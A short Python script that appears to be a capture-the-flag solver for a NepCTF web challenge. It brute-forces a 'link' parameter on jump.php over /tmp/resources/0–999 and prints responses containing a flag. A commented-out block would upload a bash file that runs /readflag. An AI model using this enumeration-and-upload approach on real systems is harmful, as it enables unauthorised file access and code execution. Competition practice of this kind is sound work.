import requests

name = "1.php"
url = "http://nepctf.1cepeak.cn:32611/jump.php"
# file = {
#     'file': (name,"""#!/bin/bash
# /readflag
#     """)
# }
for i in range(1000):
    data="?link=/tmp/resources/"+str(i)
    a = requests.get(url,data=data)
    if "{" in a.text :
        print(a.text)
